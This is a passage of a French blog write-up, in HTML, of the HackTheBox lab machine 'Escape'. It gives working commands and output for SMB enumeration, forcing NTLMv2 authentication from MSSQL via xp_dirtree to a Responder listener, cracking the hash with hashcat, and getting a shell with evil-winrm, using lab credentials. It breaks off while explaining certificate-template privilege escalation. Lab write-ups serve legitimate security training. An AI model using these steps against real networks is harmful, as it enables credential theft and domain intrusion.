@@ -1,0 +1,794 @@
+<!DOCTYPE html>
+<html lang="en"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8" />
+  <meta
+    name="description"
+    content="Author: Kien Nguyen <kiennt2609@gmail.com>
+      A minimal Hugo theme with Tailwind CSS"
+  />
+  <title>
+    
+      Blog de TaylorDeDordogne
+      | Windows Box : Escape
+    
+  </title>
+  <meta name="author" content="map[email:taylordedordogne@gmail.com name:TaylorDeDordogne]" />
+  <meta name="description" content="" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  
+  <link
+    rel="icon"
+    href="/favicon_io/favicon.ico"
+    type="image/x-icon"
+  />
+  <link
+    rel="icon"
+    href="/favicon_io/favicon-16x16.png"
+    size="16x16"
+    type="image/png"
+  />
+  <link
+    rel="icon"
+    href="/favicon_io/favicon-32x32.png"
+    size="32x32"
+    type="image/png"
+  />
+
+  <link
+    rel="preload"
+    type="text/css"
+    href="/css/rose-pine.min.css"
+    integrity=""
+    as="style"
+    onload="this.onload=null;this.rel='stylesheet'"
+  />
+  <noscript>
+    <link
+      rel="stylesheet"
+      type="text/css"
+      href="/css/rose-pine.min.css"
+      integrity=""
+    />
+  </noscript>
+<link
+    rel="preload"
+    type="text/css"
+    href="/css/toigian.css"
+    integrity=""
+    as="style"
+    onload="this.onload=null;this.rel='stylesheet'"
+  />
+  <noscript>
+    <link
+      rel="stylesheet"
+      type="text/css"
+      href="/css/toigian.css"
+      integrity=""
+    />
+  </noscript>
+
+  
+  <link
+    rel="stylesheet"
+    type="text/css"
+    href="/css/light.css"
+    integrity=""
+  />
+  <link
+    rel="stylesheet"
+    type="text/css"
+    href="/css/dark.css"
+    integrity=""
+  />
+
+  <script>
+    
+    if (
+      localStorage.theme === "dark" ||
+      (!("theme" in localStorage) &&
+        window.matchMedia("(prefers-color-scheme: dark)").matches)
+    ) {
+      document.documentElement.classList.add("dark");
+    } else {
+      document.documentElement.classList.remove("dark");
+    }
+  </script>
+
+  
+  
+  <script
+    async
+    defer
+    src="/js/main.js"
+    integrity=""
+  ></script>
+  <script src="https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js"></script>
+  <script>
+    mermaid.initialize({ startOnLoad: true, securityLevel: "loose" });
+  </script>
+  
+  
+</head>
+<body><header style="--layer: 10">
+  <div
+    aria-hidden="true"
+    class="absolute top-[-1000px] left-0 z-[calc(var(--layer)+1)] h-[calc(1000px+var(--page-top))] w-full bg-base"
+  ></div>
+
+  <div
+    class="fixed top-0 left-0 z-[var(--layer)] flex h-header-height w-full items-center border-b px-page-gutter before:absolute before:inset-0 before:z-[-1] before:bg-base [@supports(backdrop-filter:blur(0))]:before:bg-base [@supports(backdrop-filter:blur(0))]:before:backdrop-blur-md"
+  ><div
+  class="lowercase italic mx-auto flex w-full max-w-content items-center justify-between"
+>
+  <nav class="mr-3">
+    <ol class="flex text-md items-center">
+      
+  
+    
+  
+    
+  
+  
+  
+  <li>
+    
+    
+    <a href="/" class="text-muted focus:underline focus:outline-none pr-1 whitespace-nowrap">Blog de TaylorDeDordogne</a>
+  </li>
+  
+    <li class="text-muted focus:underline focus:outline-none pr-1 whitespace-nowrap">/</li>
+  
+
+  
+  
+  
+  <li>
+    
+    
+    <a href="/posts/" class="text-muted focus:underline focus:outline-none pr-1 whitespace-nowrap">Posts</a>
+  </li>
+  
+    <li class="text-muted focus:underline focus:outline-none pr-1 whitespace-nowrap">/</li>
+  
+
+  
+  
+  
+    
+  
+  <li>
+    
+    
+    <a href="/posts/htb-escape/" class="focus:underline focus:outline-none font-bold pr-1 hidden md:block">Windows Box : Escape</a>
+  </li>
+  
+
+    </ol>
+  </nav>
+  <nav class="ml-3">
+    <ul class="flex text-md whitespace-nowrap">
+      
+    </ul>
+  </nav>
+</div>
+
+
+</div>
+</header>
+<main class="flex justify-center px-page-gutter py-page-top">
+      <div class="min-h-content w-full max-w-content space-y-10 sm:space-y-20"><div
+  class="lowercase italic mx-auto flex w-full max-w-content items-center justify-between"
+>
+  <nav class="mr-3">
+    <ol class="flex text-md items-center">
+      
+  
+    
+  
+    
+  
+  
+  
+  <li>
+    
+    
+    <a href="/" class="text-muted focus:underline focus:outline-none pr-1 whitespace-nowrap">Blog de TaylorDeDordogne</a>
+  </li>
+  
+    <li class="text-muted focus:underline focus:outline-none pr-1 whitespace-nowrap">/</li>
+  
+
+  
+  
+  
+  <li>
+    
+    
+    <a href="/posts/" class="text-muted focus:underline focus:outline-none pr-1 whitespace-nowrap">Posts</a>
+  </li>
+  
+    <li class="text-muted focus:underline focus:outline-none pr-1 whitespace-nowrap">/</li>
+  
+
+  
+  
+  
+    
+  
+  <li>
+    
+    
+    <a href="/posts/htb-escape/" class="focus:underline focus:outline-none font-bold pr-1 hidden md:block">Windows Box : Escape</a>
+  </li>
+  
+
+    </ol>
+  </nav>
+  <nav class="ml-3">
+    <ul class="flex text-md whitespace-nowrap">
+      
+    </ul>
+  </nav>
+</div>
+
+
+<article>
+  <h1>Windows Box : Escape</h1>
+  <time class="text-sm italic tabular-nums text-muted"
+  >2023/06/15&nbsp;</time
+>
+
+  
+
+  
+    <div class="section">
+      
+        
+        <a href="/tags/pentest/" id="tag">Pentest</a>
+      
+        
+        <a href="/tags/hackthebox/" id="tag">HackTheBox</a>
+      
+    </div>
+  
+
+
+<div id="toc">
+  
+    
+      <details open>
+        <summary>Table of contents</summary>
+        <div id="toc-list"><nav id="TableOfContents">
+  <ol>
+    <li><a href="#introduction">Introduction</a></li>
+    <li><a href="#reconnaissance">Reconnaissance</a>
+      <ol>
+        <li><a href="#scans">Scans</a></li>
+        <li><a href="#accès-à-la-base-de-données">Accès à la base de données</a></li>
+      </ol>
+    </li>
+    <li><a href="#obtention-des-premiers-creds">Obtention des premiers creds</a>
+      <ol>
+        <li><a href="#relay-attack-sur-le-compte-mssql">Relay attack sur le compte MSSQL</a></li>
+      </ol>
+    </li>
+    <li><a href="#obtention-du-foothold-sur-le-domain-controller">Obtention du foothold sur le Domain controller</a></li>
+    <li><a href="#pivoting-puis-privesc">Pivoting puis privesc</a>
+      <ol>
+        <li><a href="#pivoting">Pivoting</a></li>
+        <li><a href="#privesc">Privesc</a>
+          <ol>
+            <li><a href="#explication">Explication</a></li>
+            <li><a href="#exploitation">Exploitation</a></li>
+          </ol>
+        </li>
+      </ol>
+    </li>
+    <li><a href="#conclusion">Conclusion</a></li>
+  </ol>
+</nav></div>
+      </details>
+    
+  
+</div>
+<div class="content"><h2 id="introduction">Introduction</h2>
+<p>Cette box était une machine windows de niveau medium qui faisait intervenir notamment une privesc basée sur la demande de certificat au sein de l&rsquo;Active Directory!
+On va commencer tout de suite en lançant un scan nmap comme pour toutes les boxs HTB.</p>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<h3 id="scans">Scans</h3>
+<p>Le scan présente bien toutes les caractéristiques d&rsquo;un <code>Domain Controller</code>, on y voit les ports <code>445</code> et <code>139</code> pour le smb, le port <code>88</code> pour le <code>TGS</code> et le service DNS habituel:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-14 04:53 EDT
+</span></span><span class="line"><span class="cl">Nmap scan report for 10.10.11.202
+</span></span><span class="line"><span class="cl">Host is up (0.028s latency).
+</span></span><span class="line"><span class="cl">Not shown: 988 filtered tcp ports (no-response)
+</span></span><span class="line"><span class="cl">PORT     STATE SERVICE       VERSION
+</span></span><span class="line"><span class="cl">53/tcp   open  domain        Simple DNS Plus
+</span></span><span class="line"><span class="cl">88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-05-14 16:53:31Z)
+</span></span><span class="line"><span class="cl">135/tcp  open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+</span></span><span class="line"><span class="cl">389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
+</span></span><span class="line"><span class="cl">| ssl-cert: Subject: commonName=dc.sequel.htb
+</span></span><span class="line"><span class="cl">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc.sequel.htb
+</span></span><span class="line"><span class="cl">| Not valid before: 2022-11-18T21:20:35
+</span></span><span class="line"><span class="cl">|_Not valid after:  2023-11-18T21:20:35
+</span></span><span class="line"><span class="cl">|_ssl-date: 2023-05-14T16:54:52+00:00; +8h00m13s from scanner time.
+</span></span><span class="line"><span class="cl">445/tcp  open  microsoft-ds?
+</span></span><span class="line"><span class="cl">464/tcp  open  kpasswd5?
+</span></span><span class="line"><span class="cl">593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span class="line"><span class="cl">636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
+</span></span><span class="line"><span class="cl">| ssl-cert: Subject: commonName=dc.sequel.htb
+</span></span><span class="line"><span class="cl">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc.sequel.htb
+</span></span><span class="line"><span class="cl">| Not valid before: 2022-11-18T21:20:35
+</span></span><span class="line"><span class="cl">|_Not valid after:  2023-11-18T21:20:35
+</span></span><span class="line"><span class="cl">|_ssl-date: 2023-05-14T16:54:51+00:00; +8h00m12s from scanner time.
+</span></span><span class="line"><span class="cl">1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
+</span></span><span class="line"><span class="cl">|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
+</span></span><span class="line"><span class="cl">| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
+</span></span><span class="line"><span class="cl">| Not valid before: 2023-05-13T20:58:31
+</span></span><span class="line"><span class="cl">|_Not valid after:  2053-05-13T20:58:31
+</span></span><span class="line"><span class="cl">|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
+</span></span><span class="line"><span class="cl">|_ssl-date: 2023-05-14T16:54:52+00:00; +8h00m13s from scanner time.
+</span></span><span class="line"><span class="cl">3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
+</span></span><span class="line"><span class="cl">|_ssl-date: 2023-05-14T16:54:52+00:00; +8h00m13s from scanner time.
+</span></span><span class="line"><span class="cl">| ssl-cert: Subject: commonName=dc.sequel.htb
+</span></span><span class="line"><span class="cl">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc.sequel.htb
+</span></span><span class="line"><span class="cl">| Not valid before: 2022-11-18T21:20:35
+</span></span><span class="line"><span class="cl">|_Not valid after:  2023-11-18T21:20:35
+</span></span><span class="line"><span class="cl">3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
+</span></span><span class="line"><span class="cl">| ssl-cert: Subject: commonName=dc.sequel.htb
+</span></span><span class="line"><span class="cl">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc.sequel.htb
+</span></span><span class="line"><span class="cl">| Not valid before: 2022-11-18T21:20:35
+</span></span><span class="line"><span class="cl">|_Not valid after:  2023-11-18T21:20:35
+</span></span><span class="line"><span class="cl">|_ssl-date: 2023-05-14T16:54:51+00:00; +8h00m12s from scanner time.
+</span></span><span class="line"><span class="cl">Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Host script results:
+</span></span><span class="line"><span class="cl">|_clock-skew: mean: 8h00m12s, deviation: 0s, median: 8h00m12s
+</span></span><span class="line"><span class="cl">| smb2-time: 
+</span></span><span class="line"><span class="cl">|   date: 2023-05-14T16:54:11
+</span></span><span class="line"><span class="cl">|_  start_date: N/A
+</span></span><span class="line"><span class="cl">| smb2-security-mode: 
+</span></span><span class="line"><span class="cl">|   311: 
+</span></span><span class="line"><span class="cl">|_    Message signing enabled and required
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap done: 1 IP address (1 host up) scanned in 92.07 seconds
+</span></span></code></pre></div><p>On remarque aussi un serveur <code>MSSQL</code> sur le port <code>1433</code>.</p>
+<p>Après avoir simplement essayé de se connecter au serveur smb et rajouté le nom de domaine du DC dans notre hostfile, On va essayer de se connecter au smb en <code>NULL Authentication</code> avec crackmapexec. Il s&rsquo;avère que pour que la NULL Authentication fonctionne il faut que le nom d&rsquo;utilisateur ne soit pas existant sur la machine, on peut prendre un nom aléatoire et essayer de lister les shares disponibles:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">cme smb 10.10.11.202 --shares -u &#39;g&#39; -p &#39;&#39;    
+</span></span><span class="line"><span class="cl">SMB         10.10.11.202    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
+</span></span><span class="line"><span class="cl">SMB         10.10.11.202    445    DC               [+] sequel.htb\g: 
+</span></span><span class="line"><span class="cl">SMB         10.10.11.202    445    DC               [+] Enumerated shares
+</span></span><span class="line"><span class="cl">SMB         10.10.11.202    445    DC               Share           Permissions     Remark
+</span></span><span class="line"><span class="cl">SMB         10.10.11.202    445    DC               -----           -----------     ------
+</span></span><span class="line"><span class="cl">SMB         10.10.11.202    445    DC               ADMIN$                          Remote Admin
+</span></span><span class="line"><span class="cl">SMB         10.10.11.202    445    DC               C$                              Default share
+</span></span><span class="line"><span class="cl">SMB         10.10.11.202    445    DC               IPC$            READ            Remote IPC
+</span></span><span class="line"><span class="cl">SMB         10.10.11.202    445    DC               NETLOGON                        Logon server share 
+</span></span><span class="line"><span class="cl">SMB         10.10.11.202    445    DC               Public          READ            
+</span></span><span class="line"><span class="cl">SMB         10.10.11.202    445    DC               SYSVOL                          Logon server share
+</span></span></code></pre></div><p>Ok visiblement on a accès en lecture à une share inhabituelle: <code>Public</code>. On va maintenant utiliser <code>smbclient</code> pour lister les fichiers disponibles dessus:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">smbclient -N -U &#39;g&#39; //10.10.11.202/Public
+</span></span><span class="line"><span class="cl">Try &#34;help&#34; to get a list of possible commands.
+</span></span><span class="line"><span class="cl">smb: \&gt; dir
+</span></span><span class="line"><span class="cl">  .                                   D        0  Sat Nov 19 06:51:25 2022
+</span></span><span class="line"><span class="cl">  ..                                  D        0  Sat Nov 19 06:51:25 2022
+</span></span><span class="line"><span class="cl">  SQL Server Procedures.pdf           A    49551  Fri Nov 18 08:39:43 2022
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                5184255 blocks of size 4096. 1462488 blocks available
+</span></span><span class="line"><span class="cl">smb: \&gt; get &#34;SQL Server Procedures.pdf&#34;
+</span></span><span class="line"><span class="cl">getting file \SQL Server Procedures.pdf of size 49551 as SQL Server Procedures.pdf (306.3 KiloBytes/sec) (average 306.3 KiloBytes/sec)
+</span></span><span class="line"><span class="cl">smb: \&gt; exit
+</span></span></code></pre></div><p>Jetons un oeil au PDF que nous venons de récupérer:</p>
+<div>
+    <img src="assets/PDF_bonus.PNG", style="max-width:150%;margin-left: 50%;transform: translateX(-50%);">
+</div>
+<p>A la fin de ce dernier on tombe sur des creds de la base de données, destinés au nouveaux arrivants 😁, on va aller jeter un oeil là bas.</p>
+<h3 id="accès-à-la-base-de-données">Accès à la base de données</h3>
+<p>Pour se connecter à une base de données MSSQL sous linux il est possible d&rsquo;utiliser <code>sqsh</code> ou l&rsquo;utilitaire proposé par <code>Impacket</code>, ce que nous allons faire ici:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py sequel.htb/PublicUser:GuestUserCantWrite1@10.10.11.202
+</span></span><span class="line"><span class="cl">Impacket v0.10.0 - Copyright <span class="m">2022</span> SecureAuth Corporation
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Encryption required, switching to TLS
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> ENVCHANGE<span class="o">(</span>DATABASE<span class="o">)</span>: Old Value: master, New Value: master
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> ENVCHANGE<span class="o">(</span>LANGUAGE<span class="o">)</span>: Old Value: , New Value: us_english
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> ENVCHANGE<span class="o">(</span>PACKETSIZE<span class="o">)</span>: Old Value: 4096, New Value: <span class="m">16192</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> INFO<span class="o">(</span>DC<span class="se">\S</span>QLMOCK<span class="o">)</span>: Line 1: Changed database context to <span class="s1">&#39;master&#39;</span>.
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> INFO<span class="o">(</span>DC<span class="se">\S</span>QLMOCK<span class="o">)</span>: Line 1: Changed language setting to us_english.
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> ACK: Result: <span class="m">1</span> - Microsoft SQL Server <span class="o">(</span><span class="m">150</span> 7208<span class="o">)</span> 
+</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Press <span class="nb">help</span> <span class="k">for</span> extra shell commands
+</span></span><span class="line"><span class="cl">SQL&gt; SELECT name FROM master.dbo.sysdatabases<span class="p">;</span>
+</span></span><span class="line"><span class="cl">name                                                                                                                               
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">--------------------------------------------------------------------------------------------------------------------------------   
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">master                                                                                                                             
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">tempdb                                                                                                                             
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">model                                                                                                                              
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">msdb
+</span></span></code></pre></div><h2 id="obtention-des-premiers-creds">Obtention des premiers creds</h2>
+<p>Ok donc il n&rsquo;y a que les bases de données par défault de MSSQL, cela ne sert à rien d&rsquo;aller chercher à l&rsquo;intérieur. Pour obtenir un foothold sur le serveur il va soit nous falloir obtenir les creds du compte sur lequel tourne le serveur SQL, soit arriver à RCE tout de suite. C&rsquo;est sur la première option que l&rsquo;on va se concentrer pour avancer.</p>
+<h3 id="relay-attack-sur-le-compte-mssql">Relay attack sur le compte MSSQL</h3>
+<p>Malheureusement la commande <code>xp_cmdshell</code> permettant d&rsquo;exécuter des commandes n&rsquo;est pas accessible, après quelque recherches on tombe sur une méthode d&rsquo;exploitation qui permet de mettre en place une <code>Relay attack</code> à partir d&rsquo;un accès MSSQL: En utilisant la commande <code>xp_dirtree</code> qui permet d&rsquo;accéder à une resssource distante.</p>
+<p>En effet si on fait en sorte que le serveur fasse une requete SMB vers un serveur que l&rsquo;on contrôle, pour s&rsquo;authentifier il enverra son hash <code>NTLMv2</code> que nous pourrons cracker en offline. On va donc lancer notre serveur SMB avec l&rsquo;outil <code>Responder</code> sur l&rsquo;interface connectée au VPN comme ceci:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">sudo responder -I tun0
+</span></span></code></pre></div><p>On lance ensuite la requete SMB vers notre machine depuis le serveur MSSQL:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">SQL&gt; xp_dirtree &#39;\\10.10.14.34\test&#39;
+</span></span></code></pre></div><p>Et on obtient les hash du compte <code>sql_svc</code> sur lequel tourne le serveur:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">[+] Listening for events...                                                                                                                                                                                        
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[SMB] NTLMv2-SSP Client   : 10.10.11.202
+</span></span><span class="line"><span class="cl">[SMB] NTLMv2-SSP Username : sequel\sql_svc
+</span></span><span class="line"><span class="cl">[SMB] NTLMv2-SSP Hash     : sql_svc::sequel:8795c31e953d3cb4:FA875D8F149BE0462933AF6BC3AEB7CB:01010000000000000003A987799FD901ECF16D600E6BBEFB00000000020008004F0043004F00590001001E00570049004E002D00340038004F0039004E0057003700420039004F004B0004003400570049004E002D00340038004F0039004E0057003700420039004F004B002E004F0043004F0059002E004C004F00430041004C00030014004F0043004F0059002E004C004F00430041004C00050014004F0043004F0059002E004C004F00430041004C00070008000003A987799FD90106000400020000000800300030000000000000000000000000300000F13673A0A84F1123BC030B1965AC9686C878500990100A183A4A1D42B4336C9F0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00330034000000000000000000
+</span></span></code></pre></div><p>Et il ne reste plus qu&rsquo;à le cracker avec hashcat:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">hashcat -m 5600 sql_hash.txt /usr/share/wordlists/rockyou.txt
+</span></span><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl">SQL_SVC::sequel:8795c31e953d3cb4:fa875d8f149be0462933af6bc3aeb7cb:01010000000000000003a987799fd901ecf16d600e6bbefb00000000020008004f0043004f00590001001e00570049004e002d00340038004f0039004e0057003700420039004f004b0004003400570049004e002d00340038004f0039004e0057003700420039004f004b002e004f0043004f0059002e004c004f00430041004c00030014004f0043004f0059002e004c004f00430041004c00050014004f0043004f0059002e004c004f00430041004c00070008000003a987799fd90106000400020000000800300030000000000000000000000000300000f13673a0a84f1123bc030b1965ac9686c878500990100a183a4a1d42b4336c9f0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00330034000000000000000000:REGGIE1234ronnie
+</span></span><span class="line"><span class="cl">                                                          
+</span></span><span class="line"><span class="cl">Session..........: hashcat
+</span></span><span class="line"><span class="cl">Status...........: Cracked
+</span></span><span class="line"><span class="cl">Hash.Mode........: 5600 (NetNTLMv2)
+</span></span><span class="line"><span class="cl">Hash.Target......: SQL_SVC::sequel:8795c31e953d3cb4:fa875d8f149be04629...000000
+</span></span><span class="line"><span class="cl">Time.Started.....: Thu Jun 15 11:21:43 2023 (14 secs)
+</span></span><span class="line"><span class="cl">Time.Estimated...: Thu Jun 15 11:21:57 2023 (0 secs)
+</span></span><span class="line"><span class="cl">Kernel.Feature...: Pure Kernel
+</span></span><span class="line"><span class="cl">Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+</span></span><span class="line"><span class="cl">Guess.Queue......: 1/1 (100.00%)
+</span></span><span class="line"><span class="cl">Speed.#1.........:   755.7 kH/s (1.59ms) @ Accel:512 Loops:1 Thr:1 Vec:8
+</span></span><span class="line"><span class="cl">Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+</span></span><span class="line"><span class="cl">Progress.........: 10700800/14344385 (74.60%)
+</span></span><span class="line"><span class="cl">Rejected.........: 0/10700800 (0.00%)
+</span></span><span class="line"><span class="cl">Restore.Point....: 10698752/14344385 (74.58%)
+</span></span><span class="line"><span class="cl">Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+</span></span><span class="line"><span class="cl">Candidate.Engine.: Device Generator
+</span></span><span class="line"><span class="cl">Candidates.#1....: REPIN210 -&gt; REDOCEAN22
+</span></span><span class="line"><span class="cl">Hardware.Mon.#1..: Util: 62%
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Started: Thu Jun 15 11:21:42 2023
+</span></span><span class="line"><span class="cl">Stopped: Thu Jun 15 11:21:58 2023
+</span></span></code></pre></div><h2 id="obtention-du-foothold-sur-le-domain-controller">Obtention du foothold sur le Domain controller</h2>
+<p>Nickel! Maintenant il va nous falloir obtenir un shell sur  DC, on peut commencer par voir si le service <code>WinRM</code> est utilisé par ce dernier:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">cme winrm 10.10.11.202                                                                       
+</span></span><span class="line"><span class="cl">SMB         10.10.11.202    5985   DC               [*] Windows 10.0 Build 17763 (name:DC) (domain:sequel.htb)
+</span></span><span class="line"><span class="cl">HTTP        10.10.11.202    5985   DC               [*] http://10.10.11.202:5985/wsman
+</span></span></code></pre></div><p><code>WSMan</code> est utilisé donc <code>WinRM</code> doit l&rsquo;être aussi, on va tenter de se connecter avec evil-winrm sur le compte <code>sql_svc</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">evil-winrm -u sql_svc -p REGGIE1234ronnie -i 10.10.11.202     
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Evil-WinRM shell v3.4
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Info: Establishing connection to remote endpoint
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:\Users\sql_svc\Documents&gt; whoami
+</span></span><span class="line"><span class="cl">sequel\sql_svc
+</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:\Users\sql_svc\Documents&gt; 
+</span></span></code></pre></div><p>Et on obtient notre premier shell sur le DC en tant que <code>sql_svc</code> 👍.</p>
+<h2 id="pivoting-puis-privesc">Pivoting puis privesc</h2>
+<h3 id="pivoting">Pivoting</h3>
+<p>En fouillant à la racine du disque on trouve un dossier <code>SQLServer</code> contenant des Logs et dans l&rsquo;une d&rsquo;elle quelque chose d&rsquo;assez intéressant:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">2022-11-18 13:43:07.44 Logon       Error: 18456, Severity: 14, State: 8.
+</span></span><span class="line"><span class="cl">2022-11-18 13:43:07.44 Logon       Logon failed for user &#39;sequel.htb\Ryan.Cooper&#39;. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
+</span></span><span class="line"><span class="cl">2022-11-18 13:43:07.48 Logon       Error: 18456, Severity: 14, State: 8.
+</span></span><span class="line"><span class="cl">2022-11-18 13:43:07.48 Logon       Logon failed for user &#39;NuclearMosquito3&#39;. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
+</span></span><span class="line"><span class="cl">2022-11-18 13:43:07.72 spid51      Attempting to load library &#39;xpstar.dll&#39; into memory. This is an informational message only. No user action is required.
+</span></span><span class="line"><span class="cl">2022-11-18 13:43:07.76 spid51      Using &#39;xpstar.dll&#39; version &#39;2019.150.2000&#39; to execute extended stored procedure &#39;xp_sqlagent_is_starting&#39;. This is an informational message only; no user action is required.
+</span></span><span class="line"><span class="cl">2022-11-18 13:43:08.24 spid51      Changed database context to &#39;master&#39;.
+</span></span><span class="line"><span class="cl">2022-11-18 13:43:08.24 spid51      Changed language setting to us_english.
+</span></span></code></pre></div><p>L&rsquo;utilisateur <code>Ryan.Cooper</code> a essayé de se connecter et c&rsquo;est trompé en mettant son mot de passe à la place de son nom d&rsquo;utilisateur, on va pouvoir pivoter sur son compte.</p>
+<p>Une fois connecté en tant que Ryan, on peut récupérer le premier flag sur son bureau: <code>2f60dd9b4e3e3deeec9373f3c70a1011</code>.</p>
+<h3 id="privesc">Privesc</h3>
+<p>Comme suggéré par le nom du challenge (<code>ESCcape</code>), on va se pencher sur les privescs se basant sur les requêtes de certificats du <code>Certificate Service</code> de l&rsquo;Active Directory. Voilà tout d&rsquo;abord une petite explication sur le fonctionnemnet du Certificate Service:</p>
+<h4 id="explication">Explication</h4>
+<p>Le Certificate Service a pour objectif de fournir des certificats utilisés pour du chiffrement ou pour l&rsquo;authentification par exemple. Pour qu&rsquo;un utilisateur obtienne un certificat, il faut qu&rsquo;il envoie une <code>CSR</code> (Certificate Signing Request) à la <code>CA</code>. Voilà ce que cette requête va contenir:</p>
+<ul>
+<li>La clé publique que l&rsquo;utilisateur veut associer à son identité sur l&rsquo;AD.</li>
+<li>Un sujet à qui associer le certificat.</li>
+<li>Un <code>EKU</code> (Extended/Enhanced Key Usage), qui définit ce pour quoi le certificat va être utilisé.</li>
+<li>Un <code>Certificate Templates</code> qui est un ensemble de règles et de paramètres qui vont être appliqués au certificat comme sa durée de validité par exemple.</li>
+</ul>
+<p>Voilà un schéma du procédé d&rsquo;obtention du certificat:</p>
+<div>
+    <img src="assets/CSR_schema.png", style="max-width:150%;margin-left: 50%;transform: translateX(-50%);">
+</div>
+<p>Ce qui va nous permettre d&rsquo;élever nos privilèges est une option du template appellée <code>subjectAltName</code> qui permet d&rsquo;associer d&rsquo;autres identités au certificat. J&rsquo;ai trouvé une explication à l&rsquo;existence de cette option <a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2">ici</a>: En fait, associer plusieurs sujets à un seul certificat peut s&rsquo;avérer utile dans le cas d&rsquo;un serveur web par exemple qui pourrait gérer plusieurs domaines avec un seul certificat SSL.</p>
